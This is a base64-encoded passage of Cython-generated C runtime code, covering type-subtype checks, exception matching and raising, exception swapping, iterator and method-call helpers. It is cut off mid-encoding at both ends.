cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9Jc1N1YnR5cGUoUHlUeXBlT2JqZWN0ICphLCBQeVR5cGVPYmplY3QgKmIpIHtcbiAgICBQeU9iamVjdCAqbXJvO1xuICAgIGlmIChhID09IGIpIHJldHVybiAxO1xuICAgIG1ybyA9IGEtPnRwX21ybztcbiAgICBpZiAobGlrZWx5KG1ybykpIHtcbiAgICAgICAgUHlfc3NpemVfdCBpLCBuO1xuICAgICAgICBuID0gUHlUdXBsZV9HRVRfU0laRShtcm8pO1xuICAgICAgICBmb3IgKGkgPSAwOyBpIDwgbjsgaSsrKSB7XG4gICAgICAgICAgICBpZiAoUHlUdXBsZV9HRVRfSVRFTShtcm8sIGkpID09IChQeU9iamVjdCAqKWIpXG4gICAgICAgICAgICAgICAgcmV0dXJuIDE7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9JbkJhc2VzKGEsIGIpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzQW55U3VidHlwZTIoUHlUeXBlT2JqZWN0ICpjbHMsIFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKSB7XG4gICAgUHlPYmplY3QgKm1ybztcbiAgICBpZiAoY2xzID09IGEgfHwgY2xzID09IGIpIHJldHVybiAxO1xuICAgIG1ybyA9IGNscy0+dHBfbXJvO1xuICAgIGlmIChsaWtlbHkobXJvKSkge1xuICAgICAgICBQeV9zc2l6ZV90IGksIG47XG4gICAgICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKG1ybyk7XG4gICAgICAgIGZvciAoaSA9IDA7IGkgPCBuOyBpKyspIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICpiYXNlID0gUHlUdXBsZV9HRVRfSVRFTShtcm8sIGkpO1xuICAgICAgICAgICAgaWYgKGJhc2UgPT0gKFB5T2JqZWN0ICopYSB8fCBiYXNlID09IChQeU9iamVjdCAqKWIpXG4gICAgICAgICAgICAgICAgcmV0dXJuIDE7XG4gICAgICAgIH1cbiAgICAgICAgcmV0dXJuIDA7XG4gICAgfVxuICAgIHJldHVybiBfX1B5eF9JbkJhc2VzKGNscywgYSkgfHwgX19QeXhfSW5CYXNlcyhjbHMsIGIpO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2lubmVyX1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlczIoUHlPYmplY3QgKmVyciwgUHlPYmplY3QqIGV4Y190eXBlMSwgUHlPYmplY3QgKmV4Y190eXBlMikge1xuICAgIGlmIChleGNfdHlwZTEpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0lzQW55U3VidHlwZTIoKFB5VHlwZU9iamVjdCopZXJyLCAoUHlUeXBlT2JqZWN0KilleGNfdHlwZTEsIChQeVR5cGVPYmplY3QqKWV4Y190eXBlMik7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0lzU3VidHlwZSgoUHlUeXBlT2JqZWN0KillcnIsIChQeVR5cGVPYmplY3QqKWV4Y190eXBlMik7XG4gICAgfVxufVxuc3RhdGljIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXNUdXBsZShQeU9iamVjdCAqZXhjX3R5cGUsIFB5T2JqZWN0ICp0dXBsZSkge1xuICAgIFB5X3NzaXplX3QgaSwgbjtcbiAgICBhc3NlcnQoUHlFeGNlcHRpb25DbGFzc19DaGVjayhleGNfdHlwZSkpO1xuICAgIG4gPSBQeVR1cGxlX0dFVF9TSVpFKHR1cGxlKTtcbiAgICBmb3IgKGk9MDsgaTxuOyBpKyspIHtcbiAgICAgICAgaWYgKGV4Y190eXBlID09IFB5VHVwbGVfR0VUX0lURU0odHVwbGUsIGkpKSByZXR1cm4gMTtcbiAgICB9XG4gICAgZm9yIChpPTA7IGk8bjsgaSsrKSB7XG4gICAgICAgIFB5T2JqZWN0ICp0ID0gUHlUdXBsZV9HRVRfSVRFTSh0dXBsZSwgaSk7XG4gICAgICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayh0KSkpIHtcbiAgICAgICAgICAgIGlmIChfX1B5eF9pbm5lcl9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKGV4Y190eXBlLCBOVUxMLCB0KSkgcmV0dXJuIDE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuIDA7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0KiBleGNfdHlwZSkge1xuICAgIGlmIChsaWtlbHkoZXJyID09IGV4Y190eXBlKSkgcmV0dXJuIDE7XG4gICAgaWYgKGxpa2VseShQeUV4Y2VwdGlvbkNsYXNzX0NoZWNrKGVycikpKSB7XG4gICAgICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayhleGNfdHlwZSkpKSB7XG4gICAgICAgICAgICByZXR1cm4gX19QeXhfaW5uZXJfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihlcnIsIE5VTEwsIGV4Y190eXBlKTtcbiAgICAgICAgfSBlbHNlIGlmIChsaWtlbHkoUHlUdXBsZV9DaGVjayhleGNfdHlwZSkpKSB7XG4gICAgICAgICAgICByZXR1cm4gX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzVHVwbGUoZXJyLCBleGNfdHlwZSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgIH1cbiAgICB9XG4gICAgcmV0dXJuIFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIGV4Y190eXBlKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICpleGNfdHlwZTEsIFB5T2JqZWN0ICpleGNfdHlwZTIpIHtcbiAgICBhc3NlcnQoUHlFeGNlcHRpb25DbGFzc19DaGVjayhleGNfdHlwZTEpKTtcbiAgICBhc3NlcnQoUHlFeGNlcHRpb25DbGFzc19DaGVjayhleGNfdHlwZTIpKTtcbiAgICBpZiAobGlrZWx5KGVyciA9PSBleGNfdHlwZTEgfHwgZXJyID09IGV4Y190eXBlMikpIHJldHVybiAxO1xuICAgIGlmIChsaWtlbHkoUHlFeGNlcHRpb25DbGFzc19DaGVjayhlcnIpKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfaW5uZXJfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihlcnIsIGV4Y190eXBlMSwgZXhjX3R5cGUyKTtcbiAgICB9XG4gICAgcmV0dXJuIChQeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMoZXJyLCBleGNfdHlwZTEpIHx8IFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIGV4Y190eXBlMikpO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIHZvaWQgX19QeXhfUmFpc2UoUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiLCBQeU9iamVjdCAqY2F1c2UpIHtcbiAgICBQeU9iamVjdCogb3duZWRfaW5zdGFuY2UgPSBOVUxMO1xuICAgIGlmICh0YiA9PSBQeV9Ob25lKSB7XG4gICAgICAgIHRiID0gMDtcbiAgICB9IGVsc2UgaWYgKHRiICYmICFQeVRyYWNlQmFja19DaGVjayh0YikpIHtcbiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICJyYWlzZTogYXJnIDMgbXVzdCBiZSBhIHRyYWNlYmFjayBvciBOb25lIik7XG4gICAgICAgIGdvdG8gYmFkO1xuICAgIH1cbiAgICBpZiAodmFsdWUgPT0gUHlfTm9uZSlcbiAgICAgICAgdmFsdWUgPSAwO1xuICAgIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKHR5cGUpKSB7XG4gICAgICAgIGlmICh2YWx1ZSkge1xuICAgICAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvcixcbiAgICAgICAgICAgICAgICAiaW5zdGFuY2UgZXhjZXB0aW9uIG1heSBub3QgaGF2ZSBhIHNlcGFyYXRlIHZhbHVlIik7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICB2YWx1ZSA9IHR5cGU7XG4gICAgICAgIHR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKHZhbHVlKTtcbiAgICB9IGVsc2UgaWYgKFB5RXhjZXB0aW9uQ2xhc3NfQ2hlY2sodHlwZSkpIHtcbiAgICAgICAgUHlPYmplY3QgKmluc3RhbmNlX2NsYXNzID0gTlVMTDtcbiAgICAgICAgaWYgKHZhbHVlICYmIFB5RXhjZXB0aW9uSW5zdGFuY2VfQ2hlY2sodmFsdWUpKSB7XG4gICAgICAgICAgICBpbnN0YW5jZV9jbGFzcyA9IChQeU9iamVjdCopIFB5X1RZUEUodmFsdWUpO1xuICAgICAgICAgICAgaWYgKGluc3RhbmNlX2NsYXNzICE9IHR5cGUpIHtcbiAgICAgICAgICAgICAgICBpbnQgaXNfc3ViY2xhc3MgPSBQeU9iamVjdF9Jc1N1YmNsYXNzKGluc3RhbmNlX2NsYXNzLCB0eXBlKTtcbiAgICAgICAgICAgICAgICBpZiAoIWlzX3N1YmNsYXNzKSB7XG4gICAgICAgICAgICAgICAgICAgIGluc3RhbmNlX2NsYXNzID0gTlVMTDtcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGlzX3N1YmNsYXNzID09IC0xKSkge1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICB0eXBlID0gaW5zdGFuY2VfY2xhc3M7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfVxuICAgICAgICB9XG4gICAgICAgIGlmICghaW5zdGFuY2VfY2xhc3MpIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzO1xuICAgICAgICAgICAgaWYgKCF2YWx1ZSlcbiAgICAgICAgICAgICAgICBhcmdzID0gUHlUdXBsZV9OZXcoMCk7XG4gICAgICAgICAgICBlbHNlIGlmIChQeVR1cGxlX0NoZWNrKHZhbHVlKSkge1xuICAgICAgICAgICAgICAgIFB5X0lOQ1JFRih2YWx1ZSk7XG4gICAgICAgICAgICAgICAgYXJncyA9IHZhbHVlO1xuICAgICAgICAgICAgfSBlbHNlXG4gICAgICAgICAgICAgICAgYXJncyA9IFB5VHVwbGVfUGFjaygxLCB2YWx1ZSk7XG4gICAgICAgICAgICBpZiAoIWFyZ3MpXG4gICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICBvd25lZF9pbnN0YW5jZSA9IFB5T2JqZWN0X0NhbGwodHlwZSwgYXJncywgTlVMTCk7XG4gICAgICAgICAgICBQeV9ERUNSRUYoYXJncyk7XG4gICAgICAgICAgICBpZiAoIW93bmVkX2luc3RhbmNlKVxuICAgICAgICAgICAgICAgIGdvdG8gYmFkO1xuICAgICAgICAgICAgdmFsdWUgPSBvd25lZF9pbnN0YW5jZTtcbiAgICAgICAgICAgIGlmICghUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpIHtcbiAgICAgICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAiY2FsbGluZyAlUiBzaG91bGQgaGF2ZSByZXR1cm5lZCBhbiBpbnN0YW5jZSBvZiAiXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uLCBub3QgJVIiLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0eXBlLCBQeV9UWVBFKHZhbHVlKSk7XG4gICAgICAgICAgICAgICAgZ290byBiYWQ7XG4gICAgICAgICAgICB9XG4gICAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgInJhaXNlOiBleGNlcHRpb24gY2xhc3MgbXVzdCBiZSBhIHN1YmNsYXNzIG9mIEJhc2VFeGNlcHRpb24iKTtcbiAgICAgICAgZ290byBiYWQ7XG4gICAgfVxuICAgIGlmIChjYXVzZSkge1xuICAgICAgICBQeU9iamVjdCAqZml4ZWRfY2F1c2U7XG4gICAgICAgIGlmIChjYXVzZSA9PSBQeV9Ob25lKSB7XG4gICAgICAgICAgICBmaXhlZF9jYXVzZSA9IE5VTEw7XG4gICAgICAgIH0gZWxzZSBpZiAoUHlFeGNlcHRpb25DbGFzc19DaGVjayhjYXVzZSkpIHtcbiAgICAgICAgICAgIGZpeGVkX2NhdXNlID0gUHlPYmplY3RfQ2FsbE9iamVjdChjYXVzZSwgTlVMTCk7XG4gICAgICAgICAgICBpZiAoZml4ZWRfY2F1c2UgPT0gTlVMTClcbiAgICAgICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfSBlbHNlIGlmIChQeUV4Y2VwdGlvbkluc3RhbmNlX0NoZWNrKGNhdXNlKSkge1xuICAgICAgICAgICAgZml4ZWRfY2F1c2UgPSBjYXVzZTtcbiAgICAgICAgICAgIFB5X0lOQ1JFRihmaXhlZF9jYXVzZSk7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJleGNlcHRpb24gY2F1c2VzIG11c3QgZGVyaXZlIGZyb20gIlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICJCYXNlRXhjZXB0aW9uIik7XG4gICAgICAgICAgICBnb3RvIGJhZDtcbiAgICAgICAgfVxuICAgICAgICBQeUV4Y2VwdGlvbl9TZXRDYXVzZSh2YWx1ZSwgZml4ZWRfY2F1c2UpO1xuICAgIH1cbiAgICBQeUVycl9TZXRPYmplY3QodHlwZSwgdmFsdWUpO1xuICAgIGlmICh0Yikge1xuI2lmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwQTZcbiAgICAgICAgUHlFeGNlcHRpb25fU2V0VHJhY2ViYWNrKHZhbHVlLCB0Yik7XG4jZWxpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbiAgICAgICAgUHlUaHJlYWRTdGF0ZSAqdHN0YXRlID0gX19QeXhfUHlUaHJlYWRTdGF0ZV9DdXJyZW50O1xuICAgICAgICBQeU9iamVjdCogdG1wX3RiID0gdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrO1xuICAgICAgICBpZiAodGIgIT0gdG1wX3RiKSB7XG4gICAgICAgICAgICBQeV9JTkNSRUYodGIpO1xuICAgICAgICAgICAgdHN0YXRlLT5jdXJleGNfdHJhY2ViYWNrID0gdGI7XG4gICAgICAgICAgICBQeV9YREVDUkVGKHRtcF90Yik7XG4gICAgICAgIH1cbiNlbHNlXG4gICAgICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjtcbiAgICAgICAgUHlFcnJfRmV0Y2goJnRtcF90eXBlLCAmdG1wX3ZhbHVlLCAmdG1wX3RiKTtcbiAgICAgICAgUHlfSU5DUkVGKHRiKTtcbiAgICAgICAgUHlFcnJfUmVzdG9yZSh0bXBfdHlwZSwgdG1wX3ZhbHVlLCB0Yik7XG4gICAgICAgIFB5X1hERUNSRUYodG1wX3RiKTtcbiNlbmRpZlxuICAgIH1cbmJhZDpcbiAgICBQeV9YREVDUkVGKG93bmVkX2luc3RhbmNlKTtcbiAgICByZXR1cm47XG59XG5cblxuI2lmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU3dhcChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yikge1xuICAgIFB5T2JqZWN0ICp0bXBfdHlwZSwgKnRtcF92YWx1ZSwgKnRtcF90YjtcbiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICB0bXBfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgIGV4Y19pbmZvLT5leGNfdmFsdWUgPSAqdmFsdWU7XG4gICAgaWYgKHRtcF92YWx1ZSA9PSBOVUxMIHx8IHRtcF92YWx1ZSA9PSBQeV9Ob25lKSB7XG4gICAgICAgIFB5X1hERUNSRUYodG1wX3ZhbHVlKTtcbiAgICAgICAgdG1wX3ZhbHVlID0gTlVMTDtcbiAgICAgICAgdG1wX3R5cGUgPSBOVUxMO1xuICAgICAgICB0bXBfdGIgPSBOVUxMO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHRtcF90eXBlID0gKFB5T2JqZWN0KikgUHlfVFlQRSh0bXBfdmFsdWUpO1xuICAgICAgICBQeV9JTkNSRUYodG1wX3R5cGUpO1xuICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgICAgIHRtcF90YiA9ICgoUHlCYXNlRXhjZXB0aW9uT2JqZWN0KikgdG1wX3ZhbHVlKS0+dHJhY2ViYWNrO1xuICAgICAgICBQeV9YSU5DUkVGKHRtcF90Yik7XG4gICAgICAgICNlbHNlXG4gICAgICAgIHRtcF90YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayh0bXBfdmFsdWUpO1xuICAgICAgICAjZW5kaWZcbiAgICB9XG4gICNlbGlmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0tcbiAgICBfUHlFcnJfU3RhY2tJdGVtICpleGNfaW5mbyA9IHRzdGF0ZS0+ZXhjX2luZm87XG4gICAgdG1wX3R5cGUgPSBleGNfaW5mby0+ZXhjX3R5cGU7XG4gICAgdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSBleGNfaW5mby0+ZXhjX3RyYWNlYmFjaztcbiAgICBleGNfaW5mby0+ZXhjX3R5cGUgPSAqdHlwZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gKnZhbHVlO1xuICAgIGV4Y19pbmZvLT5leGNfdHJhY2ViYWNrID0gKnRiO1xuICAjZWxzZVxuICAgIHRtcF90eXBlID0gdHN0YXRlLT5leGNfdHlwZTtcbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5leGNfdHlwZSA9ICp0eXBlO1xuICAgIHRzdGF0ZS0+ZXhjX3ZhbHVlID0gKnZhbHVlO1xuICAgIHRzdGF0ZS0+ZXhjX3RyYWNlYmFjayA9ICp0YjtcbiAgI2VuZGlmXG4gICAgKnR5cGUgPSB0bXBfdHlwZTtcbiAgICAqdmFsdWUgPSB0bXBfdmFsdWU7XG4gICAgKnRiID0gdG1wX3RiO1xufVxuI2Vsc2VcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXhjZXB0aW9uU3dhcChQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHtcbiAgICBQeU9iamVjdCAqdG1wX3R5cGUsICp0bXBfdmFsdWUsICp0bXBfdGI7XG4gICAgUHlFcnJfR2V0RXhjSW5mbygmdG1wX3R5cGUsICZ0bXBfdmFsdWUsICZ0bXBfdGIpO1xuICAgIFB5RXJyX1NldEV4Y0luZm8oKnR5cGUsICp2YWx1ZSwgKnRiKTtcbiAgICAqdHlwZSA9IHRtcF90eXBlO1xuICAgICp2YWx1ZSA9IHRtcF92YWx1ZTtcbiAgICAqdGIgPSB0bXBfdGI7XG59XG4jZW5kaWZcblxuXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKHZvaWQpIHtcbiAgICBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fUHl4X0dldEJ1aWx0aW5OZXh0X0xpbWl0ZWRBUElfY2FjaGUpKVxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlID0gX19QeXhfR2V0QnVpbHRpbk5hbWUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25leHQpO1xuICAgIHJldHVybiBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJX2NhY2hlO1xufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfUHlJdGVyX05leHRfUGxhaW4oUHlPYmplY3QgKml0ZXJhdG9yKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMFxuICAgIFB5T2JqZWN0ICpyZXN1bHQ7XG4gICAgUHlPYmplY3QgKm5leHQgPSBfX1B5eF9HZXRCdWlsdGluTmV4dF9MaW1pdGVkQVBJKCk7XG4gICAgaWYgKHVubGlrZWx5KCFuZXh0KSkgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gUHlPYmplY3RfQ2FsbEZ1bmN0aW9uT2JqQXJncyhuZXh0LCBpdGVyYXRvciwgTlVMTCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbiNlbHNlXG4gICAgKHZvaWQpX19QeXhfR2V0QnVpbHRpbk5hbWU7IC8vIG9ubHkgZm9yIGVhcmx5IGxpbWl0ZWQgQVBJXG4gICAgaXRlcm5leHRmdW5jIGl0ZXJuZXh0ID0gX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKGl0ZXJhdG9yKTtcbiAgICBhc3NlcnQoaXRlcm5leHQpO1xuICAgIHJldHVybiBpdGVybmV4dChpdGVyYXRvcik7XG4jZW5kaWZcbn1cblxuXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKFB5T2JqZWN0KiBmdW5jdGlvbiwgUHlPYmplY3QqIGFyZzEsIFB5T2JqZWN0KiBhcmcyKSB7XG4gICAgUHlPYmplY3QgKmFyZ3NbM10gPSB7TlVMTCwgYXJnMSwgYXJnMn07XG4gICAgcmV0dXJuIF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKGZ1bmN0aW9uLCBhcmdzKzEsIDIgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpO1xufVxuXG5cbiNpZiAhKENZVEhPTl9WRUNUT1JDQUxMICYmIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDAgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDApKSlcbnN0YXRpYyBQeU9iamVjdCogX19QeXhfX1B5T2JqZWN0X0NhbGxNZXRob2QxKFB5T2JqZWN0KiBtZXRob2QsIFB5T2JqZWN0KiBhcmcpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZyhtZXRob2QsIGFyZyk7XG4gICAgUHlfREVDUkVGKG1ldGhvZCk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMShQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUsIFB5T2JqZWN0KiBhcmcpIHtcbiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAweDAzMEMwMDAwIHx8ICghQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwKSlcbiAgICBQeU9iamVjdCAqYXJnc1syXSA9IHtvYmosIGFyZ307XG4gICAgKHZvaWQpIF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZDtcbiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbE9uZUFyZztcbiAgICAodm9pZCkgX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzO1xuICAgIHJldHVybiBQeU9iamVjdF9WZWN0b3JjYWxsTWV0aG9kKG1ldGhvZF9uYW1lLCBhcmdzLCAyIHwgUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VULCBOVUxMKTtcbiNlbHNlXG4gICAgUHlPYmplY3QgKm1ldGhvZCA9IE5VTEwsICpyZXN1bHQ7XG4gICAgaW50IGlzX21ldGhvZCA9IF9fUHl4X1B5T2JqZWN0X0dldE1ldGhvZChvYmosIG1ldGhvZF9uYW1lLCAmbWV0aG9kKTtcbiAgICBpZiAobGlrZWx5KGlzX21ldGhvZCkpIHtcbiAgICAgICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfQ2FsbDJBcmdzKG1ldGhvZCwgb2JqLCBhcmcpO1xuICAgICAgICBQeV9ERUNSRUYobWV0aG9kKTtcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFtZXRob2QpKSByZXR1cm4gTlVMTDtcbiAgICByZXR1cm4gX19QeXhfX1B5T2JqZWN0X0NhbGxNZXRob2QxKG1ldGhvZCwgYXJnKTtcbiNlbmRpZlxufVxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbihQeU9iamVjdCogdmFsdWUsIGludCBhc3luYyk7XG5zdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X1JldHVybldpdGhTdG9wSXRlcmF0aW9uKFB5T2JqZWN0KiB2YWx1ZSwgaW50IGFzeW5jLCBpbnQgaXRlcm5leHQpIHtcbiAgICBpZiAodmFsdWUgPT0gUHlfTm9uZSkge1xuICAgICAgICBpZiAoYXN5bmMgfHwgIWl0ZXJuZXh0KVxuICAgICAgICAgICAgUHlFcnJfU2V0Tm9uZShhc3luYyA/IFB5RXhjX1N0b3BBc3luY0l0ZXJhdGlvbiA6IFB5RXhjX1N0b3BJdGVyYXRpb24pO1xuICAgICAgICByZXR1cm47XG4gICAgfVxuICAgIF9fUHl4X19SZXR1cm5XaXRoU3RvcEl0ZXJhdGlvbih2YWx1ZSwgYXN5bmMpO1xufVxuc3RhdGljIHZvaWQgX19QeXhfX1JldHVybldpdGhTdG9wSXRlcmF0aW9uKFB5T2JqZWN0KiB2YWx1ZSwgaW50IGFzeW5jKSB7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4jZW5kaWZcbiAgICBQeU9iamVjdCAqZXhjO1xuICAgIFB5T2JqZWN0ICpleGNfdHlwZSA9IGFzeW5jID8gUHlFeGNfU3RvcEFzeW5jSXRlcmF0aW9uIDogUHlFeGNfU3RvcEl0ZXJhdGlvbjtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05cbiAgICBpZiAoKFBZX1ZFUlNJT05fSEVYID49ICgweDAzMEMwMEE2KSkgfHwgdW5saWtlbHkoUHlUdXBsZV9DaGVjayh2YWx1ZSkgfHwgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayh2YWx1ZSkpKSB7XG4gICAgICAgIGlmIChQWV9WRVJTSU9OX0hFWCA+PSAoMHgwMzBlMDBBMSkpIHtcbiAgICAgICAgICAgIGV4YyA9IF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoZXhjX3R5cGUsIHZhbHVlKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5T2JqZWN0ICphcmdzX3R1cGxlID0gUHlUdXBsZV9OZXcoMSk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoIWFyZ3NfdHVwbGUpKSByZXR1cm47XG4gICAgICAgICAgICBQeV9JTkNSRUYodmFsdWUpO